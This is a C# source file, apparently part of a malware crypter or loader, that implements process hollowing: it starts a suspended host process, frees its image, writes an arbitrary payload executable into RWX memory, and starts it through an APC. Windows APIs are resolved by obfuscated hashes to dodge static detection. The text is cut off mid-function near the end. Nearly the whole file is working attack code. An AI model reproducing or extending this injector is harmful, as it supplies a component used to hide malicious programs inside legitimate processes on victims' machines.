using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace A
{
    unsafe public class pe_injector
    {

        #region Structures

        #region DosHeader

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DOS_HEADER
        {
            public ushort e_magic;
            public ushort e_cblp;
            public ushort e_cp;
            public ushort e_crlc;
            public ushort e_cparhdr;
            public ushort e_minalloc;
            public ushort e_maxalloc;
            public ushort e_ss;
            public ushort e_sp;
            public ushort e_csum;
            public ushort e_ip;
            public ushort e_cs;
            public ushort e_lfarlc;
            public ushort e_ovno;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
            public ushort[] e_res1;
            public ushort e_oemid;
            public ushort e_oeminfo;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
            public ushort[] e_res2;
            public int e_lfanew;
        }

        #endregion

        #region NtHeader

        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_NT_HEADERS
        {
            [FieldOffset(0)]
            public uint Signature;

            [FieldOffset(4)]
            public IMAGE_FILE_HEADER FileHeader;

            [FieldOffset(24)]
            public IMAGE_OPTIONAL_HEADER32 OptionalHeader;
        }

        #region FileHeader

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_FILE_HEADER
        {
            public ushort Machine;
            public ushort NumberOfSections;
            public uint TimeDateStamp;
            public uint PointerToSymbolTable;
            public uint NumberOfSymbols;
            public ushort SizeOfOptionalHeader;
            public ushort Characteristics;
        }

        #endregion

        #region OptionalHeader

        #region Enums

        public enum MachineType : ushort
        {
            Native = 0,
            I386 = 0x014c,
            Itanium = 0x0200,
            x64 = 0x8664
        }
        public enum MagicType : ushort
        {
            IMAGE_NT_OPTIONAL_HDR32_MAGIC = 0x10b,
            IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20b
        }
        public enum SubSystemType : ushort
        {
            IMAGE_SUBSYSTEM_UNKNOWN = 0,
            IMAGE_SUBSYSTEM_NATIVE = 1,
            IMAGE_SUBSYSTEM_WINDOWS_GUI = 2,
            IMAGE_SUBSYSTEM_WINDOWS_CUI = 3,
            IMAGE_SUBSYSTEM_POSIX_CUI = 7,
            IMAGE_SUBSYSTEM_WINDOWS_CE_GUI = 9,
            IMAGE_SUBSYSTEM_EFI_APPLICATION = 10,
            IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER = 11,
            IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER = 12,
            IMAGE_SUBSYSTEM_EFI_ROM = 13,
            IMAGE_SUBSYSTEM_XBOX = 14

        }
        public enum DllCharacteristicsType : ushort
        {
            RES_0 = 0x0001,
            RES_1 = 0x0002,
            RES_2 = 0x0004,
            RES_3 = 0x0008,
            IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE = 0x0040,
            IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY = 0x0080,
            IMAGE_DLL_CHARACTERISTICS_NX_COMPAT = 0x0100,
            IMAGE_DLLCHARACTERISTICS_NO_ISOLATION = 0x0200,
            IMAGE_DLLCHARACTERISTICS_NO_SEH = 0x0400,
            IMAGE_DLLCHARACTERISTICS_NO_BIND = 0x0800,
            RES_4 = 0x1000,
            IMAGE_DLLCHARACTERISTICS_WDM_DRIVER = 0x2000,
            IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE = 0x8000
        }

        #endregion

        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_OPTIONAL_HEADER32
        {
            [FieldOffset(0)]
            public MagicType Magic;

            [FieldOffset(2)]
            public byte MajorLinkerVersion;

            [FieldOffset(3)]
            public byte MinorLinkerVersion;

            [FieldOffset(4)]
            public uint SizeOfCode;

            [FieldOffset(8)]
            public uint SizeOfInitializedData;

            [FieldOffset(12)]
            public uint SizeOfUninitializedData;

            [FieldOffset(16)]
            public uint AddressOfEntryPoint;

            [FieldOffset(20)]
            public uint BaseOfCode;

            // PE32 contains this additional field
            [FieldOffset(24)]
            public uint BaseOfData;

            [FieldOffset(28)]
            public uint ImageBase;

            [FieldOffset(32)]
            public uint SectionAlignment;

            [FieldOffset(36)]
            public uint FileAlignment;

            [FieldOffset(40)]
            public ushort MajorOperatingSystemVersion;

            [FieldOffset(42)]
            public ushort MinorOperatingSystemVersion;

            [FieldOffset(44)]
            public ushort MajorImageVersion;

            [FieldOffset(46)]
            public ushort MinorImageVersion;

            [FieldOffset(48)]
            public ushort MajorSubsystemVersion;

            [FieldOffset(50)]
            public ushort MinorSubsystemVersion;

            [FieldOffset(52)]
            public uint Win32VersionValue;

            [FieldOffset(56)]
            public uint SizeOfImage;

            [FieldOffset(60)]
            public uint SizeOfHeaders;

            [FieldOffset(64)]
            public uint CheckSum;

            [FieldOffset(68)]
            public SubSystemType Subsystem;

            [FieldOffset(70)]
            public DllCharacteristicsType DllCharacteristics;

            [FieldOffset(72)]
            public uint SizeOfStackReserve;

            [FieldOffset(76)]
            public uint SizeOfStackCommit;

            [FieldOffset(80)]
            public uint SizeOfHeapReserve;

            [FieldOffset(84)]
            public uint SizeOfHeapCommit;

            [FieldOffset(88)]
            public uint LoaderFlags;

            [FieldOffset(92)]
            public uint NumberOfRvaAndSizes;

            [FieldOffset(96)]
            public IMAGE_DATA_DIRECTORY ExportTable;

            [FieldOffset(104)]
            public IMAGE_DATA_DIRECTORY ImportTable;

            [FieldOffset(112)]
            public IMAGE_DATA_DIRECTORY ResourceTable;

            [FieldOffset(120)]
            public IMAGE_DATA_DIRECTORY ExceptionTable;

            [FieldOffset(128)]
            public IMAGE_DATA_DIRECTORY CertificateTable;

            [FieldOffset(136)]
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;

            [FieldOffset(144)]
            public IMAGE_DATA_DIRECTORY Debug;

            [FieldOffset(152)]
            public IMAGE_DATA_DIRECTORY Architecture;

            [FieldOffset(160)]
            public IMAGE_DATA_DIRECTORY GlobalPtr;

            [FieldOffset(168)]
            public IMAGE_DATA_DIRECTORY TLSTable;

            [FieldOffset(176)]
            public IMAGE_DATA_DIRECTORY LoadConfigTable;

            [FieldOffset(184)]
            public IMAGE_DATA_DIRECTORY BoundImport;

            [FieldOffset(192)]
            public IMAGE_DATA_DIRECTORY IAT;

            [FieldOffset(200)]
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;

            [FieldOffset(208)]
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;

            [FieldOffset(216)]
            public IMAGE_DATA_DIRECTORY Reserved;
        }

        #endregion

        #endregion

        #region DataDirectory

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DATA_DIRECTORY
        {
            public uint VirtualAddress;
            public uint Size;
        }

        #endregion

        #region ExportDirectory

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_EXPORT_DIRECTORY
        {
            public uint Characteristics;
            public uint TimeDateStamp;
            public ushort MajorVersion;
            public ushort MinorVersion;
            public uint Name;
            public uint Base;
            public uint NumberOfFunctions;
            public uint NumberOfNames;
            public uint AddressOfFunctions;
            public uint AddressOfNames;
            public uint AddressOfNameOrdinals;
        }

        #endregion

        #endregion

        #region CreateProcessW

        #region Structs

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        #endregion

        #region Definition

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
        private delegate bool t_CreateProcessW(
            string lpApplicationName,
            string lpCommandline,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            IntPtr lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        #endregion

        private static t_CreateProcessW CreateProcessW;

        #endregion

        #region GetThreadContext

        #region Structs

        private enum CONTEXT_FLAGS : uint
        {
            CONTEXT_i386 = 0x10000,
            CONTEXT_i486 = 0x10000,
            CONTEXT_CONTROL = CONTEXT_i386 | 0x01,
            CONTEXT_INTEGER = CONTEXT_i386 | 0x02,
            CONTEXT_SEGMENTS = CONTEXT_i386 | 0x04,
            CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x08,
            CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x10,
            CONTEXT_EXTENDED_REGISTERS = CONTEXT_i386 | 0x20,
            CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS,
            CONTEXT_ALL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS | CONTEXT_EXTENDED_REGISTERS
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct FLOATING_SAVE_AREA
        {
            public uint ControlWord;
            public uint StatusWord;
            public uint TagWord;
            public uint ErrorOffset;
            public uint ErrorSelector;
            public uint DataOffset;
            public uint DataSelector;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
            public byte[] RegisterArea;
            public uint Cr0NpxState;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CONTEXT
        {
            public uint ContextFlags;
            public uint Dr0;
            public uint Dr1;
            public uint Dr2;
            public uint Dr3;
            public uint Dr6;
            public uint Dr7;
            public FLOATING_SAVE_AREA FloatSave;
            public uint SegGs;
            public uint SegFs;
            public uint SegEs;
            public uint SegDs;
            public uint Edi;
            public uint Esi;
            public uint Ebx;
            public uint Edx;
            public uint Ecx;
            public uint Eax;
            public uint Ebp;
            public uint Eip;
            public uint SegCs;
            public uint EFlags;
            public uint Esp;
            public uint SegSs;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 0x200, ArraySubType = UnmanagedType.I1)]
            public byte[] ExtendedRegisters;
        }


        #endregion

        #region Definition

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool t_GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

        #endregion

        private static t_GetThreadContext GetThreadContext;

        #endregion

        #region ReadProcessMemory

        #region Definition

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool t_ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            uint nSize,
            out IntPtr lpNumberOfBytesRead);

        #endregion

        private static t_ReadProcessMemory ReadProcessMemory;

        #endregion

        #region NtUnmapViewOfSection

        #region Definition

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int t_NtUnmapViewOfSection(IntPtr ProcessHandle, uint BaseAddress);

        #endregion

        private static t_NtUnmapViewOfSection NtUnmapViewOfSection;

        #endregion

        #region VirtualAllocEx

        #region Definition

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate IntPtr t_VirtualAllocEx(
                                    IntPtr hProcess,
                                    IntPtr lpAddress,
                                    uint dwSize,
                                    uint flAllocationType,
                                    uint flProtect);

        #endregion

        private static t_VirtualAllocEx VirtualAllocEx;

        #endregion

        #region VirtualProtectEx

        #region Definition

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool t_VirtualProtectEx(
                                        IntPtr hProcess,
                                        IntPtr lpAddress,
                                        uint dwSize,
                                        uint flNewProtect,
                                        ref uint lpflOldProtect);

        #endregion

        private static t_VirtualProtectEx VirtualProtectEx;

        #endregion

        #region WriteProcessMemory

        #region Definition

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool t_WriteProcessMemory(
                                    IntPtr hProcess,
                                    IntPtr lpBaseAddress,
                                    byte[] lpBuffer,
                                    uint nSize,
                                    ref uint lpNumberOfBytesWritten);


        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool t_WriteProcessMemory2(
                                    IntPtr hProcess,
                                    IntPtr lpBaseAddress,
                                    IntPtr lpBuffer,
                                    uint nSize,
                                    IntPtr lpNumberOfBytesWritten);

        #endregion

        private static t_WriteProcessMemory WriteProcessMemory;
        private static t_WriteProcessMemory2 WriteProcessMemory2;

        #endregion

        #region SetThreadContext

        #region Definition

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool t_SetThreadContext(IntPtr hThread, ref CONTEXT CTX);

        #endregion

        private static t_SetThreadContext SetThreadContext;

        #endregion

        #region ResumeThread

        #region Definition

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate int t_ResumeThread(IntPtr hThread);

        #endregion

        private static t_ResumeThread ResumeThread;

        #endregion

        #region VirtualQueryEx

        #region Structs

        private enum AllocationProtectEnum : uint
        {
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
            PAGE_WRITECOPY = 0x00000008,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400
        }

        private enum StateEnum : uint
        {
            MEM_COMMIT = 0x1000,
            MEM_FREE = 0x10000,
            MEM_RESERVE = 0x2000
        }

        private enum TypeEnum : uint
        {
            MEM_IMAGE = 0x1000000,
            MEM_MAPPED = 0x40000,
            MEM_PRIVATE = 0x20000
        }

        private struct MEMORY_BASIC_INFORMATION
        {
            public IntPtr BaseAddress;
            public IntPtr AllocationBase;
            public AllocationProtectEnum AllocationProtect;
            public uint RegionSize;
            public StateEnum State;
            public AllocationProtectEnum Protect;
            public TypeEnum Type;
        }

        #endregion

        #region Definitions

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate int t_VirtualQueryEx(
                                    IntPtr hProcess,
                                    IntPtr lpAddress,
                                    out MEMORY_BASIC_INFORMATION lpBuffer,
                                    uint dwLength);

        #endregion

        private static t_VirtualQueryEx VirtualQueryEx;

        #endregion

        #region VirtualFreeEx

        #region Definition

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool t_VirtualFreeEx(
                                    IntPtr hProcess,
                                    IntPtr lpAddress,
                                    uint dwSize,
                                    uint dwFreeType);

        #endregion

        private static t_VirtualFreeEx VirtualFreeEx;

        #endregion

        #region QueueUserAPC

        #region Definition

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate uint t_QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

        #endregion

        private static t_QueueUserAPC QueueUserAPC;

        #endregion

        #region NtQueueApcThread

        #region Definition

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate int t_NtQueueApcThread(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData, IntPtr opt2, IntPtr opt3);

        #endregion

        private static t_NtQueueApcThread NtQueueApcThread;

        #endregion

        #region KiUserApcDispatcher

        #region Definition

        private delegate void t_KiUserApcDispatcher(IntPtr a, IntPtr b, IntPtr c, IntPtr ContextStart, IntPtr ContextBody);

        #endregion

        private static t_KiUserApcDispatcher KiUserApcDispatcher;

        #endregion

        #region NtAlertResumeThread

        #region Definition

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate int t_NtAlertResumeThread(IntPtr ThreadHandle, ref ulong SuspendCount);

        #endregion

        private static t_NtAlertResumeThread NtAlertResumeThread;

        #endregion

        #region NtAllocateVirtualMemory

        #region Definition

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate int t_NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, uint ZeroBits, ref uint RegionSize, uint AllocationType, uint Protect);

        #endregion

        private static t_NtAllocateVirtualMemory NtAllocateVirtualMemory;

        #endregion


        private static T LoadFunction<T>(IntPtr lpModuleBase, uint dwFunctionHash)
        {
            IntPtr lpFunction = GetProcAddress(lpModuleBase, dwFunctionHash);

            if (IntPtr.Zero == lpFunction)
                return default(T);

            return (T)Convert.ChangeType(Marshal.GetDelegateForFunctionPointer(lpFunction, typeof(T)), typeof(T));
        }

        private static void InitAPI()
        {
            IntPtr lpKernel32 = GetKernel32BaseAddress();
            IntPtr lpNtdll = GetNtdllBaseAddress();

            // kernel32 functions
            CreateProcessW = LoadFunction<t_CreateProcessW>(lpKernel32, 0xA0F20974);
            GetThreadContext = LoadFunction<t_GetThreadContext>(lpKernel32, 0xCF0067E3);
            ReadProcessMemory = LoadFunction<t_ReadProcessMemory>(lpKernel32, 0x3301084);
            NtUnmapViewOfSection = LoadFunction<t_NtUnmapViewOfSection>(lpNtdll, 0x424ED548);
            VirtualAllocEx = LoadFunction<t_VirtualAllocEx>(lpKernel32, 0x99B37A95);
            VirtualProtectEx = LoadFunction<t_VirtualProtectEx>(lpKernel32, 0x687D2F5B);
            VirtualQueryEx = LoadFunction<t_VirtualQueryEx>(lpKernel32, 0x92F50AF2);
            VirtualFreeEx = LoadFunction<t_VirtualFreeEx>(lpKernel32, 0x33A84D20);
            WriteProcessMemory = LoadFunction<t_WriteProcessMemory>(lpKernel32, 0x8C1E9A9B);
            WriteProcessMemory2 = LoadFunction<t_WriteProcessMemory2>(lpKernel32, 0x8C1E9A9B);
            SetThreadContext = LoadFunction<t_SetThreadContext>(lpKernel32, 0xEE430B5F);
            ResumeThread = LoadFunction<t_ResumeThread>(lpKernel32, 0x6426F5F3);
            QueueUserAPC = LoadFunction<t_QueueUserAPC>(lpKernel32, 0x7D81A082);

            // ntdll functions
            NtQueueApcThread = LoadFunction<t_NtQueueApcThread>(lpNtdll, 0x22FA0B1F);
            NtAlertResumeThread = LoadFunction<t_NtAlertResumeThread>(lpNtdll, 0x4E44E6F7);
            NtAllocateVirtualMemory = LoadFunction<t_NtAllocateVirtualMemory>(lpNtdll, 0x3F47E8B);
        }

        private struct HostProcessInfo
        {
            public STARTUPINFO SI;
            public PROCESS_INFORMATION PI;
            public CONTEXT CTX;

            public uint ImageBase;
            public uint ImageSize;
        }

        private static bool InitHostProcess(string pszFormattedPath, ref HostProcessInfo HPI)
        {
            bool bResult;

            STARTUPINFO lpStartupInfo = new STARTUPINFO();
            PROCESS_INFORMATION lpProcessInformation = new PROCESS_INFORMATION();

            // create child process
            bResult = CreateProcessW(
                               null,
                               pszFormattedPath,
                               IntPtr.Zero,
                               IntPtr.Zero,
                               false,
                               0x04,
                               IntPtr.Zero,
                               IntPtr.Zero,
                               ref lpStartupInfo,
                               out lpProcessInformation);

            if (!bResult)
                return false;

            HPI.SI = lpStartupInfo;
            HPI.PI = lpProcessInformation;

            // get peb->ImageBaseAddress of host process
            CONTEXT CTX = new CONTEXT();
            CTX.ContextFlags = (uint)CONTEXT_FLAGS.CONTEXT_ALL;

            // YOU Dont actually need getthreadcontext ->??? you just need peb->Imagebaseaddress
            bResult = GetThreadContext(HPI.PI.hThread, ref CTX);

            if (!bResult)
                return false;

            HPI.CTX = CTX;

            // patch the peb fields in  _RTL_USER_PROCESS_PARAMETERS +0x010 
            // +0x038 ImagePathName    : _UNICODE_STRING
            // +0x040 CommandLine      : _UNICODE_STRING? do u need to patch this or is created with CreateProcessW?
            IntPtr pPEB = (IntPtr)CTX.Ebx;

            //string _unformattedQuotedPath = pszFormattedPath.Trim('"');

            //{
            //    /* init unicode string in foreign process */
            //    uint __out = 0;
            //    int len = _unformattedQuotedPath.Length * 2;
            //    int maxlen = len + 2;
            //    IntPtr lpForeignImagePathName = VirtualAllocEx(HPI.PI.hProcess, IntPtr.Zero, (uint)maxlen, 0x3000, 0x40);
            //    byte[] pBb = new UnicodeEncoding().GetBytes(_unformattedQuotedPath);
            //    WriteProcessMemory(HPI.PI.hProcess, lpForeignImagePathName, pBb, (uint)pBb.Length, ref __out);

            //    /* update the field */
            //    IntPtr _rtl_user_proc_params = ReadProcessMemory(HPI(IntPtr)((uint)pPEB + 0x010);
            //    IntPtr _image_Path_name = (IntPtr)((uint)_rtl_user_proc_params + 0x038);

            //}

            // read peb
            byte[] _readBuffer = new byte[sizeof(uint)];
            IntPtr _outBuffer = IntPtr.Zero;
            // ctx.ebx = peb*
            // ctx.ebx + 8 = ImageBaseAddress
            bResult = ReadProcessMemory(
                            HPI.PI.hProcess,
                            (IntPtr)(HPI.CTX.Ebx + 8),
                            _readBuffer,
                            sizeof(uint),
                            out _outBuffer);

            if (!bResult)
                return false;

            HPI.ImageBase = BitConverter.ToUInt32(_readBuffer, 0);

            // find how much mapped memory we have to work with
            IntPtr lpCurrentAddress = (IntPtr)HPI.ImageBase;
            MEMORY_BASIC_INFORMATION mbi = new MEMORY_BASIC_INFORMATION();
            // iterate through mapped memory space
            while (VirtualQueryEx(
                            HPI.PI.hProcess,
                            lpCurrentAddress,
                            out mbi,
                            (uint)sizeof(MEMORY_BASIC_INFORMATION)) != 0)
            {
                if (mbi.State == StateEnum.MEM_FREE)
                    break;
                lpCurrentAddress = (IntPtr)((uint)(lpCurrentAddress) + mbi.RegionSize);
            }
            // size of mapped memory ?? == Nt->SizeOfImage
            HPI.ImageSize = (uint)lpCurrentAddress - HPI.ImageBase;

            return bResult;
        }

        private static bool AllocateImageSpace(HostProcessInfo HPI, ref IntPtr newImageBase, uint dwImageBase, uint dwSizeOfImage)
        {
            // attempt to allocate space at the target imagebase (5 times, in case of any NtAllocateVirtualMemory Fails?? , or is this only with VirtualAllocEX...?

            int NT_STAT = -1;
            int dwAttempts = 0;

            IntPtr lpAllocBaseAddress = (IntPtr)dwImageBase;
            uint dwRegionSize = dwSizeOfImage;

            while (dwAttempts < 5)
            {
                NT_STAT = NtAllocateVirtualMemory(HPI.PI.hProcess, ref lpAllocBaseAddress, 0, ref dwRegionSize, 0x3000, 0x40);

                if (NT_STAT == 0 /* yes, i know NT_SUCCESS is not this: but it _should_ not return anything else but 0x00)*/)
                    break;

                dwAttempts++;
            }

            // if we failed to allocate at imagebase, try to allocate it at some random point in process memory...
            if (NT_STAT != 0)
            {
                dwAttempts = 0;
                lpAllocBaseAddress = (IntPtr)dwImageBase;
                dwRegionSize = dwSizeOfImage;

                while (dwAttempts < 5)
                {
                    NT_STAT = NtAllocateVirtualMemory(HPI.PI.hProcess, ref lpAllocBaseAddress, 0, ref dwRegionSize, 0x3000, 0x40);

                    if (NT_STAT == 0)
                        break;

                    dwAttempts++;
                }

                if (NT_STAT != 0)
                    return false;
            }

            newImageBase = lpAllocBaseAddress;

            return true;
        }

        public static bool Run2(byte[] lpExe, string pszApplicationPath, string pszCmdLine = default(string))
        {
            bool bResult = false;

            pszApplicationPath = string.Format("\"{0}\"", pszApplicationPath);

            if (!string.IsNullOrEmpty(pszCmdLine))
                pszApplicationPath = string.Join(" ", new string[] { pszApplicationPath, pszCmdLine });

            byte* lpExeBase;

            fixed (byte* lpData = &lpExe[0])
                lpExeBase = lpData;

            // init local structs
            IMAGE_DOS_HEADER pIDH = (IMAGE_DOS_HEADER)Marshal.PtrToStructure((IntPtr)lpExeBase, typeof(IMAGE_DOS_HEADER));
            IMAGE_NT_HEADERS pINH = (IMAGE_NT_HEADERS)Marshal.PtrToStructure((IntPtr)(lpExeBase + pIDH.e_lfanew), typeof(IMAGE_NT_HEADERS));

            if (pIDH.e_magic != 0x5A4D || pINH.Signature != 0x4550)
                return false;

            // init host process
            HostProcessInfo HPI = new HostProcessInfo();
            bResult = InitHostProcess(pszApplicationPath, ref HPI);

            IntPtr v = IntPtr.Zero;

            /* if (pINH.OptionalHeader.ImageBase == HPI.ImageBase &&
                 pINH.OptionalHeader.SizeOfImage <= HPI.ImageSize && false)
             {
                 // use existing memory for our payload exe
                 v = (IntPtr)HPI.ImageBase;
                 uint dwOldProtect = 0;

                 bResult = VirtualProtectEx(
                          HPI.PI.hProcess,
                          (IntPtr)HPI.ImageBase,
                          HPI.ImageSize,
                          0x40,
                          ref dwOldProtect);

                 if (!bResult)
                     return false;
             }
             else
             {*/
            // try to unmap the host process image
            //try freeing with virtualfree

            VirtualFreeEx(HPI.PI.hProcess,
                 (IntPtr)HPI.ImageBase, HPI.ImageSize, 0x8000);

            //NtUnmapViewOfSection(HPI.PI.hProcess, HPI.ImageBase);

            //int NtStatus = NtUnmapViewOfSection(HPI.PI.hProcess, HPI.ImageBase);
            bResult = true; //NtStatus == 0 ? true : false;

            if (!bResult)
                return false;

            // allocate memory for the payload in payload's original imagebase
            //v = VirtualAllocEx(
            //            HPI.PI.hProcess,
            //            (IntPtr)pINH.OptionalHeader.ImageBase,
            //            pINH.OptionalHeader.SizeOfImage,
            //            0x3000,
            //            0x40);

            //int dwAttempts = 0;

            //while (dwAttempts < 5)
            //{
            //    IntPtr lpAllocBaseAddress = (IntPtr)pINH.OptionalHeader.ImageBase;
            //    uint dwAllocRegionSize = pINH.OptionalHeader.SizeOfImage;

            //    int ret = NtAllocateVirtualMemory(HPI.PI.hProcess, ref lpAllocBaseAddress, 0, ref dwAllocRegionSize, 0x3000, 0x40);
            //    v = lpAllocBaseAddress;
            //}

            //IntPtr lpAllocBaseAddress = (IntPtr)pINH.OptionalHeader.ImageBase;
            //uint dwAllocRegionSize = pINH.OptionalHeader.SizeOfImage;

            //int ret = NtAllocateVirtualMemory(HPI.PI.hProcess, ref lpAllocBaseAddress, 0, ref dwAllocRegionSize, 0x3000, 0x40);
            //v = lpAllocBaseAddress;

            IntPtr newV = IntPtr.Zero;
            bResult = AllocateImageSpace(HPI, ref newV, pINH.OptionalHeader.ImageBase, pINH.OptionalHeader.SizeOfImage);
            //  Debugger.Break();

            v = newV; //don't need ternarys when using comparison operators, js

            //if (v != (IntPtr)pINH.OptionalHeader.ImageBase)
            //    Debugger.Break();
            // so v == 0? lol i thought i caught that
            //I am overriding your if statement above it rn
            // won't calc.exe only execute the first statement (the if statement above)?
            //yeah prob, but you should always free it anyways

            if (!bResult)
                return false;

            //  }

            if ((uint)v == 0)
            {
                // could try relocating peb if it has relocation table ?
                // allocate at random place?
            }

            // patch peb->ImageBaseAddress
            byte[] _writeImageBase = BitConverter.GetBytes((uint)v);
            uint dwNumberOfBytesWritten = 0;

            bResult = WriteProcessMemory(
                                HPI.PI.hProcess,
                                (IntPtr)(HPI.CTX.Ebx + 8),
                                _writeImageBase,
                                sizeof(uint),
                                ref dwNumberOfBytesWritten);

            bResult = bResult && dwNumberOfBytesWritten == sizeof(uint) ? true : false;

            if (!bResult)
                return false;

            // patch Nt->ImageBase in payload exe QWORD <-> DWORD
            pINH.OptionalHeader.ImageBase = (uint)v;

            // copy the payload headers
            bResult = WriteProcessMemory(
                                HPI.PI.hProcess,
                                v,
                                lpExe,
                                pINH.OptionalHeader.SizeOfHeaders,
                                ref dwNumberOfBytesWritten);

            bResult = bResult && dwNumberOfBytesWritten == pINH.OptionalHeader.SizeOfHeaders ? true : false;

            if (!bResult)
                return false;

            // copy the payload sections
            for (int i = 0; i < pINH.FileHeader.NumberOfSections; i++)
            {
                uint VirtualAddress = 0;
                uint SizeOfRawData = 0;
                uint PointerToRawData = 0;

                fixed (byte* lpModuleBase = &lpExe[0])
                {
                    uint e_lfanew = *(uint*)(lpModuleBase + 0x3c);
                    byte* ishBase = lpModuleBase + e_lfanew + 0xF8 + (i * 0x28);
                    VirtualAddress = *(uint*)(ishBase + 0xc);
                    SizeOfRawData = *(uint*)(ishBase + 0x10);
                    PointerToRawData = *(uint*)(ishBase + 0x14);
                }

                byte[] lpBuffer = new byte[SizeOfRawData];
                Buffer.BlockCopy(lpExe, (int)PointerToRawData, lpBuffer, 0, (int)SizeOfRawData);

                if (SizeOfRawData == 0) /* virtual section */
                    continue;

                bResult = WriteProcessMemory(
                                    HPI.PI.hProcess,
                                    (IntPtr)((uint)v + VirtualAddress),
                                    lpBuffer,
                                    SizeOfRawData,
                                    ref dwNumberOfBytesWritten);

                bResult = (bResult && dwNumberOfBytesWritten == SizeOfRawData);

                if (!bResult)
                    return false;
            }

            if ((uint)v == HPI.ImageBase)
                HPI.CTX.Eax = pINH.OptionalHeader.ImageBase + pINH.OptionalHeader.AddressOfEntryPoint;
            else
                HPI.CTX.Eax = (uint)v + pINH.OptionalHeader.AddressOfEntryPoint;

            //bResult = SetThreadContext(HPI.PI.hThread, ref HPI.CTX);

            //if (!bResult)
            //    return false;

            // QueueUserAPC((IntPtr)HPI.CTX.Eax, HPI.PI.hThread, IntPtr.Zero);

            NtQueueApcThread(HPI.PI.hThread, (IntPtr)HPI.CTX.Eax, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);

            ulong suspend = 0;
            NtAlertResumeThread(HPI.PI.hThread, ref suspend);

            //   ResumeThread(HPI.PI.hThread);

            return bResult;
        }

        private static uint FNVHash(string str)
        {
            uint fnv_prime = 0x811C9DC5;
            uint hash = 0;

            for (int i = 0; i < str.Length; i++)
            {
                hash *= fnv_prime;
                hash ^= str[i];
            }

            return hash;
        }

        private static IntPtr GetKernel32BaseAddress()
        {
            foreach (ProcessModule pModule in Process.GetCurrentProcess().Modules)
            {
                if (FNVHash(pModule.ModuleName) == 0x39A15124)
                    return pModule.BaseAddress;
            }

